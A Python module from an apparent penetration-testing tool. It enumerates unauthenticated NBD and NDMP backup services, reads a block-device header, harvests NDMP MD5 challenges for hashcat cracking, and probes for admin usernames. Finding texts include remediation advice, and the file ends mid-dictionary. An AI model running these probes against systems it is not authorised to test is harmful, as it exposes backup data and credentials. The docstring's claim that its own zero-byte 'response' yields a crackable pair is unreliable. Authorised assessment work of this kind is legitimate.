"""NBD (10809/tcp) + NDMP (10000/tcp) storage/backup enumeration (stdlib only).

Two backup-plane protocols recce previously did not touch:

  * **NBD** speaks the fixed-newstyle handshake, then unauthenticated
    NBD_OPT_LIST enumerates every exported block device by name and
    description. NBD_OPT_INFO reveals size + transmission flags
    (read-only / trim / rotational). NBD_OPT_STARTTLS negotiates whether
    the transport is cleartext-only. A one-block NBD_CMD_READ at offset 0
    fingerprints the on-disk format (LUKS / VMDK / QCOW / MBR / GPT /
    ext4 / NTFS). Read-only throughout: recce never enters full
    transmission and never writes.

  * **NDMP** is the SNIA-standard backup control protocol. Speaks XDR
    over TCP: NDMP_CONNECT_OPEN, then CONFIG_GET_HOST_INFO /
    SERVER_INFO / FS_INFO / TAPE_INFO / SCSI_INFO / AUTH_ATTR - all of
    which return crown-jewel topology on stock configs BEFORE any
    credential is required. AUTH_MD5 challenges are captured verbatim
    for offline HMAC-MD5 cracking (hashcat -m 50). AUTH_NONE and
    AUTH_TEXT advertisements are flagged as unauth / cleartext.

Airgap-safe: stdlib socket + struct only. Every socket op is timeout-
bounded via proxy.scaled().
"""
from __future__ import annotations

import binascii
import socket
import struct
import time

from ..core import proxy
from ..core.models import Host, Port
from .svccommon import finding_builder


# --- shared -----------------------------------------------------------------

_NBD_PORT = 10809
_NDMP_PORT = 10000
_TIMEOUT = 4.0


def is_nbd(port: Port) -> bool:
    svc = f"{port.service} {port.product}".lower()
    if port.portid == _NBD_PORT:
        return True
    if "nbd" in svc and "webnbd" not in svc:
        return True
    if (port.banner or "").startswith("NBDMAGIC"):
        return True
    return False


def is_ndmp(port: Port) -> bool:
    svc = f"{port.service} {port.product}".lower()
    if "ndmp" in svc:
        return True
    if port.portid == _NDMP_PORT and svc.strip() in ("", "unknown", "tcpwrapped"):
        return True
    return False


# --- NBD wire ---------------------------------------------------------------

# NBD magic constants (per NBD protocol docs, Handshake section).
NBD_MAGIC = b"NBDMAGIC"
NBD_IHAVEOPT = b"IHAVEOPT"
NBD_OPTS_MAGIC = NBD_IHAVEOPT
NBD_REP_MAGIC = 0x3E889045565A9

# Oldstyle magic (cliserv_magic) that follows NBDMAGIC in a pre-newstyle greeting.
NBD_OLDSTYLE_MAGIC = 0x00420281861253

# Options.
NBD_OPT_ABORT = 2
NBD_OPT_LIST = 3
NBD_OPT_STARTTLS = 5
NBD_OPT_INFO = 6
NBD_OPT_GO = 7
NBD_OPT_STRUCTURED_REPLY = 8

# Reply types.
NBD_REP_ACK = 1
NBD_REP_SERVER = 2
NBD_REP_INFO = 3
NBD_REP_ERR_UNSUP = 0x80000001
NBD_REP_ERR_POLICY = 0x80000002
NBD_REP_ERR_INVALID = 0x80000003
NBD_REP_ERR_PLATFORM = 0x80000004
NBD_REP_ERR_TLS_REQD = 0x80000005

# Info responses to NBD_OPT_INFO / NBD_OPT_GO.
NBD_INFO_EXPORT = 0
NBD_INFO_NAME = 1
NBD_INFO_DESCRIPTION = 2
NBD_INFO_BLOCK_SIZE = 3

# Transmission flags (uint16, from NBD_INFO_EXPORT).
NBD_FLAG_HAS_FLAGS = 1 << 0
NBD_FLAG_READ_ONLY = 1 << 1
NBD_FLAG_SEND_FLUSH = 1 << 2
NBD_FLAG_SEND_FUA = 1 << 3
NBD_FLAG_ROTATIONAL = 1 << 4
NBD_FLAG_SEND_TRIM = 1 << 5
NBD_FLAG_SEND_WRITE_ZEROES = 1 << 6

# Transmission-phase request magic + read command.
NBD_REQUEST_MAGIC = 0x25609513
NBD_SIMPLE_REPLY_MAGIC = 0x67446698
NBD_CMD_READ = 0
NBD_CMD_DISC = 2

# Filesystem / on-disk magic strings for block-0 fingerprinting.
# Each entry: (offset, magic_bytes, human_label).
_BLOCK0_SIGNATURES: list[tuple[int, bytes, str]] = [
    (0x0000, b"LUKS\xba\xbe", "LUKS-encrypted volume"),
    (0x0000, b"KDMV", "VMDK descriptor"),
    (0x0000, b"QFI\xfb", "QCOW / QCOW2 image"),
    (0x0000, b"conectix", "Microsoft VHD footer marker"),
    (0x0000, b"vhdxfile", "Microsoft VHDX"),
    (0x0003, b"NTFS    ", "NTFS filesystem"),
    (0x0000, b"XFSB", "XFS filesystem"),
    (0x0000, b"EFI PART", "GPT / EFI partition table"),
    (0x0438, b"\x53\xEF", "ext2/3/4 filesystem"),
    (0x0036, b"FAT12   ", "FAT12 filesystem"),
    (0x0036, b"FAT16   ", "FAT16 filesystem"),
    (0x0052, b"FAT32   ", "FAT32 filesystem"),
]


def _match_block0(block: bytes) -> str:
    """Return the human label of the first matching signature, or ""."""
    for off, magic, label in _BLOCK0_SIGNATURES:
        if len(block) < off + len(magic):
            continue
        if block[off:off + len(magic)] == magic:
            return label
    # MBR signature 0x55AA at offset 0x1FE of the first 512-byte sector.
    if len(block) >= 0x200 and block[0x1FE:0x200] == b"\x55\xAA":
        return "MBR partition table"
    return ""


def _recvn(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except (socket.timeout, OSError):
            return b""
        if not chunk:
            return b""
        buf += chunk
    return buf


def _nbd_send_option(sock: socket.socket, option: int, data: bytes = b"") -> None:
    hdr = NBD_OPTS_MAGIC + struct.pack(">II", option, len(data))
    sock.sendall(hdr + data)


def _nbd_read_reply(sock: socket.socket) -> tuple[int, int, bytes] | None:
    """Read one option reply. Returns (option, reply_type, data) or None."""
    hdr = _recvn(sock, 20)
    if len(hdr) < 20:
        return None
    magic, option, reply_type, dlen = struct.unpack(">QIII", hdr)
    if magic != NBD_REP_MAGIC:
        return None
    if dlen > (1 << 20):
        return None
    data = _recvn(sock, dlen) if dlen else b""
    if dlen and len(data) < dlen:
        return None
    return option, reply_type, data


def _nbd_handshake(sock: socket.socket) -> dict:
    """Read the fixed-newstyle greeting and answer with our client flags.

    Returns {ok, style, handshake_flags} or {ok:False,error}.
    """
    greet = _recvn(sock, 8 + 8 + 2)
    if len(greet) < 8:
        return {"ok": False, "error": "no NBDMAGIC"}
    if greet[:8] != NBD_MAGIC:
        return {"ok": False, "error": "bad magic"}
    if len(greet) < 18:
        return {"ok": False, "error": "truncated greeting"}
    second = greet[8:16]
    if second == NBD_IHAVEOPT:
        hs_flags = struct.unpack(">H", greet[16:18])[0]
        # Client flags: FIXED_NEWSTYLE (1), NO_ZEROES (2). We advertise both.
        sock.sendall(struct.pack(">I", 0x00000003))
        return {"ok": True, "style": "fixed-newstyle",
                "handshake_flags": hs_flags}
    # oldstyle: second field is size (uint64), no options phase available.
    return {"ok": True, "style": "oldstyle", "handshake_flags": 0}


def nbd_list_exports(ip: str, port: int = _NBD_PORT,
                     timeout: float = _TIMEOUT) -> dict:
    """Fixed-newstyle handshake + NBD_OPT_LIST. Returns
    {reachable, style, exports:[{name,description}], tls, error}.

    `tls` is left empty here; nbd_tls_posture() sets it.
    """
    out: dict = {"reachable": False, "style": "", "exports": [], "error": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError as e:
        out["error"] = str(e)
        return out
    try:
        sock.settimeout(proxy.scaled(timeout))
        hs = _nbd_handshake(sock)
        if not hs.get("ok"):
            out["error"] = hs.get("error", "handshake failed")
            return out
        out["reachable"] = True
        out["style"] = hs["style"]
        if hs["style"] != "fixed-newstyle":
            return out
        _nbd_send_option(sock, NBD_OPT_LIST)
        exports: list[dict] = []
        for _ in range(256):
            r = _nbd_read_reply(sock)
            if r is None:
                break
            _opt, rtype, data = r
            if rtype == NBD_REP_ACK:
                break
            if rtype == NBD_REP_SERVER and len(data) >= 4:
                nlen = struct.unpack(">I", data[:4])[0]
                name = data[4:4 + nlen].decode("utf-8", "replace")
                desc = data[4 + nlen:].decode("utf-8", "replace")
                exports.append({"name": name, "description": desc})
                continue
            if rtype & 0x80000000:
                out["list_error"] = f"reply_type=0x{rtype:08x}"
                break
        out["exports"] = exports
        return out
    finally:
        try:
            _nbd_send_option(sock, NBD_OPT_ABORT)
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass


def _parse_info_export(data: bytes) -> dict:
    """NBD_INFO_EXPORT payload: info_type(2) + size(8) + flags(2)."""
    if len(data) < 12:
        return {}
    size, flags = struct.unpack(">QH", data[2:12])
    return {"size": size, "flags": flags}


def _parse_info_block_size(data: bytes) -> dict:
    if len(data) < 2 + 12:
        return {}
    mn, pref, mx = struct.unpack(">III", data[2:14])
    return {"block_min": mn, "block_preferred": pref, "block_max": mx}


def _decode_flags(flags: int) -> list[str]:
    names = []
    if flags & NBD_FLAG_HAS_FLAGS: names.append("HAS_FLAGS")
    if flags & NBD_FLAG_READ_ONLY: names.append("READ_ONLY")
    if flags & NBD_FLAG_SEND_FLUSH: names.append("SEND_FLUSH")
    if flags & NBD_FLAG_SEND_FUA: names.append("SEND_FUA")
    if flags & NBD_FLAG_ROTATIONAL: names.append("ROTATIONAL")
    if flags & NBD_FLAG_SEND_TRIM: names.append("SEND_TRIM")
    if flags & NBD_FLAG_SEND_WRITE_ZEROES: names.append("SEND_WRITE_ZEROES")
    return names


def _nbd_opt_export_query(sock: socket.socket, export: str,
                          option: int) -> dict:
    """Send NBD_OPT_INFO or NBD_OPT_GO for `export`. Parse reply loop."""
    name_b = export.encode("utf-8")
    # data: name-length(4) + name + info-request-count(2)
    body = struct.pack(">I", len(name_b)) + name_b + struct.pack(">H", 0)
    _nbd_send_option(sock, option, body)
    info: dict = {"export": export, "flags": [], "flags_raw": 0}
    for _ in range(16):
        r = _nbd_read_reply(sock)
        if r is None:
            info["error"] = "no-reply"
            return info
        _opt, rtype, data = r
        if rtype == NBD_REP_INFO and len(data) >= 2:
            itype = struct.unpack(">H", data[:2])[0]
            if itype == NBD_INFO_EXPORT:
                x = _parse_info_export(data)
                info["size"] = x.get("size", 0)
                info["flags_raw"] = x.get("flags", 0)
                info["flags"] = _decode_flags(info["flags_raw"])
            elif itype == NBD_INFO_BLOCK_SIZE:
                info.update(_parse_info_block_size(data))
        elif rtype == NBD_REP_ACK:
            return info
        elif rtype & 0x80000000:
            info["error"] = f"reply_type=0x{rtype:08x}"
            return info
    info.setdefault("error", "too-many-replies")
    return info


def nbd_export_info(ip: str, port: int, export: str,
                    timeout: float = _TIMEOUT) -> dict:
    """Fresh connection: handshake + NBD_OPT_INFO for a single export."""
    out: dict = {"export": export, "error": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError as e:
        out["error"] = str(e)
        return out
    try:
        sock.settimeout(proxy.scaled(timeout))
        hs = _nbd_handshake(sock)
        if not hs.get("ok") or hs["style"] != "fixed-newstyle":
            out["error"] = hs.get("error", "no-fixed-newstyle")
            return out
        info = _nbd_opt_export_query(sock, export, NBD_OPT_INFO)
        out.update(info)
        return out
    finally:
        try:
            _nbd_send_option(sock, NBD_OPT_ABORT)
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass


def nbd_tls_posture(ip: str, port: int = _NBD_PORT,
                    timeout: float = _TIMEOUT) -> dict:
    """Send NBD_OPT_STARTTLS. Returns
    {tls_supported, tls_required, ack, err_policy, err_unsup, error}."""
    out: dict = {"tls_supported": False, "tls_required": False,
                 "list_before_tls": False, "error": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError as e:
        out["error"] = str(e)
        return out
    try:
        sock.settimeout(proxy.scaled(timeout))
        hs = _nbd_handshake(sock)
        if not hs.get("ok") or hs["style"] != "fixed-newstyle":
            out["error"] = hs.get("error", "no-fixed-newstyle")
            return out
        # Whether NBD_OPT_LIST was possible BEFORE TLS - i.e. plaintext leak.
        _nbd_send_option(sock, NBD_OPT_LIST)
        pre_tls_list_ok = False
        while True:
            r = _nbd_read_reply(sock)
            if r is None:
                break
            _opt, rtype, _data = r
            if rtype == NBD_REP_SERVER:
                pre_tls_list_ok = True
                continue
            if rtype == NBD_REP_ACK or rtype & 0x80000000:
                break
        out["list_before_tls"] = pre_tls_list_ok

        _nbd_send_option(sock, NBD_OPT_STARTTLS)
        r = _nbd_read_reply(sock)
        if r is None:
            out["error"] = "no-tls-reply"
            return out
        _opt, rtype, _data = r
        if rtype == NBD_REP_ACK:
            out["tls_supported"] = True
        elif rtype == NBD_REP_ERR_POLICY:
            out["tls_supported"] = False
        elif rtype == NBD_REP_ERR_UNSUP:
            out["tls_supported"] = False
            out["too_old"] = True
        else:
            out["error"] = f"reply_type=0x{rtype:08x}"
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass


def nbd_block0_fingerprint(ip: str, port: int, export: str,
                           timeout: float = _TIMEOUT) -> dict:
    """NBD_OPT_GO + one 512-byte NBD_CMD_READ at offset 0. Fingerprint the
    on-disk format, then NBD_CMD_DISC. Returns {label, hex_head, error}."""
    out: dict = {"export": export, "label": "", "hex_head": "", "error": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError as e:
        out["error"] = str(e)
        return out
    try:
        sock.settimeout(proxy.scaled(timeout))
        hs = _nbd_handshake(sock)
        if not hs.get("ok") or hs["style"] != "fixed-newstyle":
            out["error"] = hs.get("error", "no-fixed-newstyle")
            return out
        info = _nbd_opt_export_query(sock, export, NBD_OPT_GO)
        if info.get("error"):
            out["error"] = f"GO refused: {info['error']}"
            return out
        # Transmission phase: NBD_CMD_READ handle=1, offset=0, length=4096.
        # 4KB is one preferred block; large enough to catch the ext superblock
        # magic at 0x438 while still being a single, small read.
        handle = 1
        read_len = 4096
        req = struct.pack(">IHHQQI",
                          NBD_REQUEST_MAGIC,
                          0,                    # flags
                          NBD_CMD_READ,         # type
                          handle,
                          0,                    # offset
                          read_len)             # length
        sock.sendall(req)
        reply_hdr = _recvn(sock, 16)
        if len(reply_hdr) < 16:
            out["error"] = "no-read-reply"
            return out
        magic, err, rhandle = struct.unpack(">IIQ", reply_hdr)
        if magic != NBD_SIMPLE_REPLY_MAGIC or rhandle != handle:
            out["error"] = f"bad-reply-magic=0x{magic:08x}"
            return out
        if err:
            out["error"] = f"read-error={err}"
            return out
        data = _recvn(sock, read_len)
        if len(data) < 32:
            out["error"] = "short-read"
            return out
        out["hex_head"] = binascii.hexlify(data[:64]).decode()
        out["label"] = _match_block0(data)
        try:
            disc = struct.pack(">IHHQQI",
                               NBD_REQUEST_MAGIC, 0, NBD_CMD_DISC, 2, 0, 0)
            sock.sendall(disc)
        except OSError:
            pass
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass


# --- NDMP wire --------------------------------------------------------------

# NDMP message codes (SNIA v4).
NDMP_CONFIG_GET_HOST_INFO = 0x100
NDMP_CONFIG_GET_CONNECTION_TYPE = 0x102
NDMP_CONFIG_GET_AUTH_ATTR = 0x103
NDMP_CONFIG_GET_BUTYPE_INFO = 0x104
NDMP_CONFIG_GET_FS_INFO = 0x105
NDMP_CONFIG_GET_TAPE_INFO = 0x106
NDMP_CONFIG_GET_SCSI_INFO = 0x107
NDMP_CONFIG_GET_SERVER_INFO = 0x108
NDMP_CONNECT_OPEN = 0x900
NDMP_CONNECT_CLIENT_AUTH = 0x901
NDMP_CONNECT_CLOSE = 0x902

NDMP_MSGTYPE_REQUEST = 0
NDMP_MSGTYPE_REPLY = 1

# Auth types.
NDMP_AUTH_NONE = 0
NDMP_AUTH_TEXT = 1
NDMP_AUTH_MD5 = 2
_AUTH_NAMES = {NDMP_AUTH_NONE: "NONE", NDMP_AUTH_TEXT: "TEXT",
               NDMP_AUTH_MD5: "MD5"}


def _xdr_string(s: bytes | str) -> bytes:
    if isinstance(s, str):
        s = s.encode("utf-8")
    pad = (4 - len(s) % 4) % 4
    return struct.pack(">I", len(s)) + s + b"\x00" * pad


def _xdr_read_string(buf: bytes, off: int) -> tuple[bytes, int]:
    if off + 4 > len(buf):
        return b"", off
    n = struct.unpack(">I", buf[off:off + 4])[0]
    if n > (1 << 20) or off + 4 + n > len(buf):
        return b"", off
    s = buf[off + 4:off + 4 + n]
    pad = (4 - n % 4) % 4
    return s, off + 4 + n + pad


def _xdr_read_uint(buf: bytes, off: int) -> tuple[int, int]:
    if off + 4 > len(buf):
        return 0, off
    return struct.unpack(">I", buf[off:off + 4])[0], off + 4


def _xdr_read_uquad(buf: bytes, off: int) -> tuple[int, int]:
    if off + 8 > len(buf):
        return 0, off
    hi, lo = struct.unpack(">II", buf[off:off + 8])
    return (hi << 32) | lo, off + 8


class _NDMPClient:
    """Sequence + framed XDR sender/receiver for NDMP."""

    def __init__(self, sock: socket.socket, timeout: float):
        self.sock = sock
        self.timeout = timeout
        self.seq = 1
        self.sock.settimeout(proxy.scaled(timeout))

    def _send_frame(self, payload: bytes) -> None:
        # RFC 5531 record-marking: high bit = last fragment, 31 bits = size.
        frag = struct.pack(">I", 0x80000000 | len(payload)) + payload
        self.sock.sendall(frag)

    def _recv_frame(self, deadline: float) -> bytes:
        chunks: list[bytes] = []
        while True:
            self.sock.settimeout(max(0.1, deadline - time.monotonic()))
            hdr = _recvn(self.sock, 4)
            if len(hdr) < 4:
                return b""
            n = struct.unpack(">I", hdr)[0]
            last = bool(n & 0x80000000)
            size = n & 0x7FFFFFFF
            if size > (1 << 20):
                return b""
            body = _recvn(self.sock, size) if size else b""
            chunks.append(body)
            if last:
                return b"".join(chunks)

    def request(self, message: int, body: bytes = b"") -> tuple[dict, bytes]:
        """Send NDMP request, return (header_dict, body_bytes) from the reply.
        header_dict: {sequence, timestamp, msg_type, message, reply_seq, error}
        """
        seq = self.seq
        self.seq += 1
        header = struct.pack(">IIIIII",
                             seq, int(time.time()) & 0xFFFFFFFF,
                             NDMP_MSGTYPE_REQUEST, message, 0, 0)
        self._send_frame(header + body)
        deadline = time.monotonic() + self.timeout
        frame = self._recv_frame(deadline)
        if len(frame) < 24:
            return {}, b""
        hdr = struct.unpack(">IIIIII", frame[:24])
        h = {"sequence": hdr[0], "timestamp": hdr[1], "msg_type": hdr[2],
             "message": hdr[3], "reply_sequence": hdr[4], "error": hdr[5]}
        return h, frame[24:]


def _ndmp_connect_open(client: _NDMPClient, version: int) -> dict:
    body = struct.pack(">I", version)
    hdr, reply = client.request(NDMP_CONNECT_OPEN, body)
    if not hdr:
        return {"ok": False, "error": "no-reply"}
    err, _ = _xdr_read_uint(reply, 0)
    return {"ok": err == 0, "error_code": err, "version": version}


def _parse_server_info(reply: bytes) -> dict:
    """error(4) + vendor(str) + product(str) + revision(str) +
    auth_types<>(uint count + uint values)."""
    err, off = _xdr_read_uint(reply, 0)
    vendor, off = _xdr_read_string(reply, off)
    product, off = _xdr_read_string(reply, off)
    revision, off = _xdr_read_string(reply, off)
    count, off = _xdr_read_uint(reply, off)
    auth: list[int] = []
    for _ in range(min(count, 8)):
        v, off = _xdr_read_uint(reply, off)
        auth.append(v)
    return {"error": err,
            "vendor": vendor.decode("utf-8", "replace"),
            "product": product.decode("utf-8", "replace"),
            "revision": revision.decode("utf-8", "replace"),
            "auth_types": auth,
            "auth_type_names": [_AUTH_NAMES.get(a, f"unk({a})") for a in auth]}


def _parse_host_info(reply: bytes) -> dict:
    """error(4) + hostname(str) + os_type(str) + os_vers(str) + hostid(str)."""
    err, off = _xdr_read_uint(reply, 0)
    hostname, off = _xdr_read_string(reply, off)
    os_type, off = _xdr_read_string(reply, off)
    os_vers, off = _xdr_read_string(reply, off)
    hostid, off = _xdr_read_string(reply, off)
    return {"error": err,
            "hostname": hostname.decode("utf-8", "replace"),
            "os_type": os_type.decode("utf-8", "replace"),
            "os_vers": os_vers.decode("utf-8", "replace"),
            "hostid": hostid.decode("utf-8", "replace")}


def _parse_fs_info(reply: bytes) -> dict:
    """error(4) + fs_info<>. Each fs_info entry:
       fs_invalid(u32) + fs_type(str) + fs_logical_device(str) +
       fs_physical_device(str) + total_size(uquad) + used_size(uquad) +
       avail_size(uquad) + total_inodes(uquad) + used_inodes(uquad) +
       fs_env<>(str,str pairs) + fs_status(str)
    Vendors vary heavily on ordering; we parse a defensive subset."""
    err, off = _xdr_read_uint(reply, 0)
    count, off = _xdr_read_uint(reply, off)
    entries: list[dict] = []
    for _ in range(min(count, 64)):
        if off >= len(reply):
            break
        _invalid, off = _xdr_read_uint(reply, off)
        fs_type, off = _xdr_read_string(reply, off)
        logdev, off = _xdr_read_string(reply, off)
        physdev, off = _xdr_read_string(reply, off)
        total, off = _xdr_read_uquad(reply, off)
        used, off = _xdr_read_uquad(reply, off)
        avail, off = _xdr_read_uquad(reply, off)
        _ti, off = _xdr_read_uquad(reply, off)
        _ui, off = _xdr_read_uquad(reply, off)
        # env pairs
        n_env, off = _xdr_read_uint(reply, off)
        env: list[tuple[str, str]] = []
        for _e in range(min(n_env, 32)):
            k, off = _xdr_read_string(reply, off)
            v, off = _xdr_read_string(reply, off)
            env.append((k.decode("utf-8", "replace"),
                        v.decode("utf-8", "replace")))
        status, off = _xdr_read_string(reply, off)
        entries.append({
            "fs_type": fs_type.decode("utf-8", "replace"),
            "logical_device": logdev.decode("utf-8", "replace"),
            "physical_device": physdev.decode("utf-8", "replace"),
            "total_size": total, "used_size": used, "avail_size": avail,
            "env": env,
            "status": status.decode("utf-8", "replace"),
        })
    return {"error": err, "filesystems": entries}


def _parse_dev_list(reply: bytes, kind: str) -> dict:
    """CONFIG_GET_TAPE_INFO / SCSI_INFO share shape:
       error(4) + count + [model(str) + device<>(str,vendor,product,rev)]."""
    err, off = _xdr_read_uint(reply, 0)
    count, off = _xdr_read_uint(reply, off)
    entries: list[dict] = []
    for _ in range(min(count, 64)):
        if off >= len(reply):
            break
        model, off = _xdr_read_string(reply, off)
        n_dev, off = _xdr_read_uint(reply, off)
        devs: list[dict] = []
        for _d in range(min(n_dev, 16)):
            dev, off = _xdr_read_string(reply, off)
            vendor, off = _xdr_read_string(reply, off)
            product, off = _xdr_read_string(reply, off)
            rev, off = _xdr_read_string(reply, off)
            _sn, off = _xdr_read_string(reply, off)
            devs.append({"device": dev.decode("utf-8", "replace"),
                         "vendor": vendor.decode("utf-8", "replace"),
                         "product": product.decode("utf-8", "replace"),
                         "revision": rev.decode("utf-8", "replace")})
        entries.append({"model": model.decode("utf-8", "replace"),
                        "devices": devs})
    return {"error": err, kind: entries}


def _parse_auth_attr(reply: bytes) -> dict:
    """error(4) + auth_type(u32) + [auth-specific body]. For AUTH_MD5 the
    body is a 64-byte challenge. For AUTH_TEXT the body is empty."""
    err, off = _xdr_read_uint(reply, 0)
    auth_type, off = _xdr_read_uint(reply, off)
    out: dict = {"error": err, "auth_type": auth_type,
                 "auth_type_name": _AUTH_NAMES.get(auth_type, f"unk({auth_type})")}
    if auth_type == NDMP_AUTH_MD5 and len(reply) >= off + 64:
        out["challenge"] = reply[off:off + 64]
    return out


def ndmp_probe(ip: str, port: int = _NDMP_PORT,
               timeout: float = _TIMEOUT) -> dict:
    """Speak NDMP: CONNECT_OPEN (v4->v3->v2 fallback), then CONFIG_GET_*.

    Returns a dict with keys: reachable, version, server_info, host_info,
    fs_info, tape_info, scsi_info, auth_attr_md5, downgraded, errors.
    """
    out: dict = {"reachable": False, "version": 0, "errors": []}
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError as e:
        out["errors"].append(f"connect: {e}")
        return out
    try:
        client = _NDMPClient(sock, timeout)
        chosen = 0
        for ver in (4, 3, 2):
            r = _ndmp_connect_open(client, ver)
            if r.get("ok"):
                chosen = ver
                break
            out["errors"].append(f"CONNECT_OPEN v{ver}: err={r.get('error_code')}")
        if not chosen:
            return out
        out["reachable"] = True
        out["version"] = chosen
        out["downgraded"] = chosen < 4
        # CONFIG_GET_SERVER_INFO
        h, reply = client.request(NDMP_CONFIG_GET_SERVER_INFO)
        if h and reply:
            out["server_info"] = _parse_server_info(reply)
        # CONFIG_GET_HOST_INFO
        h, reply = client.request(NDMP_CONFIG_GET_HOST_INFO)
        if h and reply:
            out["host_info"] = _parse_host_info(reply)
        # CONFIG_GET_FS_INFO
        h, reply = client.request(NDMP_CONFIG_GET_FS_INFO)
        if h and reply:
            out["fs_info"] = _parse_fs_info(reply)
        # CONFIG_GET_TAPE_INFO
        h, reply = client.request(NDMP_CONFIG_GET_TAPE_INFO)
        if h and reply:
            out["tape_info"] = _parse_dev_list(reply, "tapes")
        # CONFIG_GET_SCSI_INFO
        h, reply = client.request(NDMP_CONFIG_GET_SCSI_INFO)
        if h and reply:
            out["scsi_info"] = _parse_dev_list(reply, "scsi")
        # CONFIG_GET_AUTH_ATTR for MD5 - request the challenge.
        body = struct.pack(">I", NDMP_AUTH_MD5)
        h, reply = client.request(NDMP_CONFIG_GET_AUTH_ATTR, body)
        if h and reply:
            out["auth_attr_md5"] = _parse_auth_attr(reply)
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass


def ndmp_capture_md5(ip: str, port: int, username: str = "recce-probe",
                    timeout: float = _TIMEOUT) -> dict:
    """Solicit a fresh AUTH_MD5 challenge, then send NDMP_CONNECT_CLIENT_AUTH
    with a bogus 16-byte response. The server's error text often names the
    real backup-admin username; the challenge is captured verbatim for
    offline HMAC-MD5 cracking (hashcat -m 50).

    Returns {captured, challenge_hex, response_hex, username, error_code,
    error_text}. `captured` is True only if we got a real 64-byte challenge.
    """
    out: dict = {"captured": False, "username": username,
                 "challenge_hex": "", "response_hex": "",
                 "error_code": 0, "error_text": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError as e:
        out["error_text"] = str(e)
        return out
    try:
        client = _NDMPClient(sock, timeout)
        for ver in (4, 3, 2):
            r = _ndmp_connect_open(client, ver)
            if r.get("ok"):
                break
        else:
            out["error_text"] = "no CONNECT_OPEN"
            return out
        body = struct.pack(">I", NDMP_AUTH_MD5)
        h, reply = client.request(NDMP_CONFIG_GET_AUTH_ATTR, body)
        if not (h and reply):
            out["error_text"] = "no AUTH_ATTR reply"
            return out
        attr = _parse_auth_attr(reply)
        challenge = attr.get("challenge", b"")
        if len(challenge) != 64:
            out["error_text"] = f"unexpected auth_type={attr.get('auth_type_name')}"
            return out
        out["captured"] = True
        out["challenge_hex"] = binascii.hexlify(challenge).decode()
        # Dummy 16-byte response so the server can complain and (sometimes)
        # name the configured admin account in its error text.
        fake_response = b"\x00" * 16
        out["response_hex"] = binascii.hexlify(fake_response).decode()
        auth_body = (struct.pack(">I", NDMP_AUTH_MD5)
                     + _xdr_string(username)
                     + fake_response)
        h, reply = client.request(NDMP_CONNECT_CLIENT_AUTH, auth_body)
        if h:
            out["error_code"] = h.get("error", 0)
            if reply:
                err, _ = _xdr_read_uint(reply, 0)
                if err:
                    out["error_code"] = err
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass


def hashcat_ndmp_md5_line(username: str, challenge_hex: str,
                          response_hex: str) -> str:
    """One hashcat-50 line: response:challenge:username."""
    return f"{response_hex}:{challenge_hex}:{username}"


# --- target discovery -------------------------------------------------------

def nbd_targets(hosts: list[Host]) -> list[dict]:
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if is_nbd(p):
                out.append({"ip": h.ip, "hostname": h.hostname,
                            "port": p.portid, "kind": "nbd"})
    return out


def ndmp_targets(hosts: list[Host]) -> list[dict]:
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if is_ndmp(p):
                out.append({"ip": h.ip, "hostname": h.hostname,
                            "port": p.portid, "kind": "ndmp"})
    return out


# --- findings ---------------------------------------------------------------

_NARRATIVE = {
    "nbd_export_list": (
        "The NBD server lists its exports with no credential. The inventory of "
        "export names (raw-disk images, VM volumes, backup device targets) is a "
        "map of the storage the operator can pull next. Restrict access with a "
        "firewall / dedicated storage VLAN, or enforce TLS + a peer certificate."),
    "nbd_export_writable": (
        "The NBD export is served without authentication AND without the "
        "READ_ONLY transmission flag - anyone reachable on the network can write "
        "raw blocks to the underlying volume. That is block-level data destruction "
        "(overwrite the partition table, encrypt every sector). Mount it read-only "
        "at the server, require TLS with client certificates, and restrict the "
        "socket to a management VLAN."),
    "nbd_cleartext": (
        "The NBD server does not require TLS - the block-device transport, "
        "including the export list and the raw block data itself, crosses the "
        "network in cleartext. Enable NBD_OPT_STARTTLS with a peer certificate."),
    "nbd_export_fingerprint": (
        "The first 512 bytes of the export identify it as a known on-disk "
        "format (LUKS / VMDK / QCOW / MBR / GPT / ext / NTFS). Combined with an "
        "unauthenticated read, the operator can pull the whole volume and mount "
        "it offline."),
    "ndmp_info_unauth": (
        "The NDMP server returns vendor / product / revision info to any "
        "TCP client that speaks CONNECT_OPEN + CONFIG_GET_SERVER_INFO - no "
        "credential required. That is a version-band into the CVE mapper and "
        "an identity-band for the filer / backup server."),
    "ndmp_host_info": (
        "NDMP CONFIG_GET_HOST_INFO returned hostname / OS / hostid pre-auth. "
        "The hostname (often FQDN) feeds known_hostnames + known_domains so "
        "DNS/LDAP/SMB/Kerberos scoring picks it up."),
    "ndmp_inventory_leak": (
        "NDMP CONFIG_GET_FS_INFO / TAPE_INFO / SCSI_INFO returned the filer's "
        "complete backup topology (filesystems + tape drives + SCSI backends) "
        "pre-auth. This is exactly what a targeted-ransomware operator wants "
        "before deciding which volume to encrypt."),
    "ndmp_md5_challenge_capture": (
        "NDMP AUTH_MD5 is HMAC-MD5(password, challenge). Any TCP client can "
        "solicit a fresh 64-byte challenge and post a response - the server "
        "hands out the challenge whether the client will authenticate or not. "
        "The captured (challenge, response) pair is offline-crackable with "
        "hashcat -m 50."),
    "ndmp_cleartext_auth": (
        "The NDMP server advertises AUTH_TEXT - the backup admin password "
        "crosses the network in cleartext. Anyone MITM-positioned on the "
        "backup VLAN reads the password directly. Disable AUTH_TEXT."),
    "ndmp_unauth": (
        "The NDMP server advertises AUTH_NONE - CONFIG_* / BUTYPE / MOVER "
        "operations require NO credential. This is direct control of the "
        "backup control plane by anyone reachable on the network."),
